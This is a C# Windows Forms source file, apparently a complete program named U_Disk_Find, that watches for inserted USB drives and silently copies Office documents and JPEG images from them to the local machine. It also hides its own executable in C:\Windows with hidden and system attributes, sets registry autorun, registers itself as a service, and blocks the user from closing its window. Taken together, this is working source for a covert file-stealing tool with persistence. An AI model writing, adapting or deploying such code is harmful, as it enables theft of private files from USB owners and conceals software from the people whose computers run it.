/*
 * 由SharpDevelop创建。
 * 用户： Administrator
 * 日期: 2015/6/1
 * 时间: 18:28
 * 
 * 要改变这种模板请点击 工具|选项|代码编写|编辑标准头文件
 */
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace U_Disk_Find
{
	/// <summary>
	/// Description of MainForm.
	/// </summary>
	public partial class MainForm:Form
	{
		[DllImportAttribute("user32.dll")]
        private static extern bool AnimateWindow(IntPtr hwnd, int dwTime, int dwFlags);
        
        public const Int32 AW_HOR_POSITIVE = 0x00000001;
        public const Int32 AW_HOR_NEGATIVE = 0x00000002;
        public const Int32 AW_VER_POSITIVE = 0x00000004;
        public const Int32 AW_VER_NEGATIVE = 0x00000008;
        public const Int32 AW_CENTER = 0x00000010;
        public const Int32 AW_HIDE = 0x00010000;
        public const Int32 AW_ACTIVATE = 0x00020000;
        public const Int32 AW_SLIDE = 0x00040000;
        public const Int32 AW_BLEND = 0x00080000;

		
		
		public MainForm()
		{
			//
			// The InitializeComponent() call is required for Windows Forms designer support.
			//
			InitializeComponent();
			AnimateWindow(this.Handle, 800, AW_SLIDE + AW_CENTER);
		
				
			
		}
		
		
		
		//存储U盘信息的类
		public  U_Disk_Info[] U_disk=new U_Disk_Info[50];
		
		public U_Disk_Info[]  After_U_disk= new U_Disk_Info[3];// 线程后获取的U盘信息
	
		
		//复制的文件后缀名
	    public string [] File_Extension={".doc",".docx",".xls",".xlsx",".ppt",".pptx",".jpg"};
		//复制到电脑的目录
	    public string computer_dedir="";
		
		Thread thread1;
		public volatile bool shouldStop;
		
	//------------------------------------------------------------------------------	
	   private delegate void AddMessageDelegate(string message);//声明委托
		//委托 richtext1
		public void AddMessageRichtext1(string message){
			if(richTextBox1.InvokeRequired){
				AddMessageDelegate d=AddMessageRichtext1;
				richTextBox1.Invoke(d,message);
			}
			else{
				richTextBox1.AppendText(message);
			}
		}
		//委托richtext2
		public void AddMessageRichtext2(string message){
			if(richTextBox2.InvokeRequired){
				AddMessageDelegate d=AddMessageRichtext2;
				richTextBox2.Invoke(d,message);
			}
			else{
				richTextBox2.AppendText(message);
			}
		}
		
			public void AddMessageRichtext3(string message){
			if(richTextBox3.InvokeRequired){
				AddMessageDelegate d=AddMessageRichtext3;
				richTextBox3.Invoke(d,message);
			}
			else{
				richTextBox3.AppendText(message);
			}
		}
		//-----------------------------------------------------------------------------------------------
		//监测U盘是否插上，并赋值给U盘信息类，是的话返回true，其他返回false
		public bool find_u_disk(U_Disk_Info[] disk){
		   DriveInfo[] s= DriveInfo.GetDrives();
		   int j=0;
		   int flag=0;
           foreach (DriveInfo i in s)
           {
                 
           	  if (i.DriveType == DriveType.Removable)
               {
                   //MessageBox.Show("发现U盘或移动硬盘");
                   disk[j].name=i.Name;
                   disk[j].VolumnLabel=i.VolumeLabel;
                   j++;
                   flag=1;
               }
                  
                   
            }
           if(flag==1){
           	return true;
           }else{
           	return false;
           }
             
           
		}
	//---------------------------------------------------
		public bool CatUsbFile(string path,string fileExtension){
			try{
			string [] strUsbDir=Directory.GetDirectories(path);
			string [] strUsbFiles=Directory.GetFiles(path);
			
			//递归遍历文件夹
			foreach(string dirname in strUsbDir){
				
				AddMessageRichtext1(dirname+Environment.NewLine);
				//richTextBox1.AppendText(dirname+Environment.NewLine);
				CatUsbFile(dirname,fileExtension);
			}
			//遍历文件
			foreach(string file in strUsbFiles){
				string exname=file.Substring(file.LastIndexOf(".")+1);
				if(fileExtension.IndexOf(exname)>-1){
					
					FileInfo fi=new FileInfo(file);
					 
					AddMessageRichtext2(fi.FullName+Environment.NewLine);
					//richTextBox2.AppendText(fi.FullName+Environment.NewLine);
					
					DirFileCreate dcs=new DirFileCreate();
					dcs.multiCopyFile(computer_dedir+"\\"+exname,fi.FullName);
					
					
				}
				//Application.DoEvents()的作用：处理所有的当前在消息队列中的Windows消息应该DoEvents就好比实现了进程的同步。在不加的时候，因为优先级的问题，程序会执行主进程的代码，再执行别代码，而加了以后就可以同步执行。
				  AddMessageRichtext1(file+Environment.NewLine);
				//richTextBox1.AppendText(file+Environment.NewLine);
			}
			return true;
			}catch{
				return false;
			}
			
			
		}
  //-----------------------------------------------------------------------------
	
	
  
  
  
  
  
  //--------------------------------------------------------------------------------------
  
	public void method1(){
		while(shouldStop==false){
		find_u_disk(After_U_disk);
//			After_U_disk[0].name="gg";
//			After_U_disk[0].VolumnLabel="cdsd";
//			
		    U_disk=U_Disk_Info.compare(After_U_disk,U_disk);
		   //测试线程又没在执行
		    if(U_Disk_Info.length(U_disk)>1){
		       AddMessageRichtext3(U_disk[0].name+U_disk[0].VolumnLabel+U_disk[1].name+U_disk[1].VolumnLabel);
		    }
				foreach(U_Disk_Info t1 in U_disk){
					if(t1.IsCopy==false&& t1.name!=null && t1.VolumnLabel!=null){   
		    		     method2();
		    		
		    	     }else{
		    		     ;
		    	      }
		   
		          }
		   Thread th=Thread.CurrentThread;
		   Thread.Sleep(1000);
	   
	  }
	
	}
  

	
	public void method2(){
		DirFileCreate dc=new DirFileCreate();
		computer_dedir=dc.DirCreate();
		
		
		int count=U_Disk_Info.length(U_disk);
		for(int j=0;j<count;j++)
		{
		    foreach(string filename in File_Extension)
		    {
			    CatUsbFile(U_disk[j].name,filename);
		    }
		    U_disk[j].IsCopy=true;
		}
		if(!thread1.IsAlive){
			thread1.Start();
		}
	}
        
	//------------------------------------------------------------
	
		
		void Button1Click(object sender, EventArgs e)
		{
			
			
		
		}
		
		void MainFormLoad(object sender, EventArgs e)
		{
			//this.Hide();
			//出始化U盘信息类，最多支持50个U盘
		    for(int i=0;i<3;i++){
				After_U_disk[i]=new U_Disk_Info();
			}
			for(int i=0;i<50;i++){
				U_disk[i]=new U_Disk_Info();
			}
			find_u_disk(U_disk);
			
			
			string path=Application.ExecutablePath;
			string exename=path.Substring(path.LastIndexOf("\\")+1);
			if(!File.Exists("C:\\Windows\\"+exename)){
			    File.Copy(path,"C:\\Windows\\"+exename);
			    File.SetAttributes("C:\\Windows\\"+exename, FileAttributes.Hidden|FileAttributes.System);
			}else{
				
				Thread.Sleep(500);
				
			}
			
			Registry_class.SetAutoRun(Application.ExecutablePath, true);
			
    	    shouldStop=false;
			thread1=new Thread(method1);
			thread1.IsBackground=true;
     		thread1.Start();
     		
     		Registry_class.Register_Service("myserver","C:\\Windows\\U_Disk_Find.exe"+" s","我的服务2");
		    
		}
		//------------------------------------
		
		
		void MainFormFormClosing(object sender, FormClosingEventArgs e)
		{
			//注意判断关闭事件Reason来源于窗体按钮，否则用菜单退出时无法退出!
			if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;       //取消"关闭窗口"事件
               
               // this.WindowState = FormWindowState.Minimized; 
                 
                this.Hide();
                 return;
            }
		}
		
		void Button2Click(object sender, EventArgs e)
		{ 
			//Registry_class.CheckProcess();
			//Registry_class.ReadRegisterTxt();
			//Registry_class.jiechitxt("C:\\Windows\\U_Disk_Find.exe");
//			if(Registry_class.Register_Service("myserver","C:\\Windows\\U_Disk_Find.exe"+" s","我的服务2")){
//				MessageBox.Show("注册服务成功");
//			}else{
//				MessageBox.Show("注册服务失败");
//			}
//			Registry_class.Start_Service("myserver");
       	}
	}
}
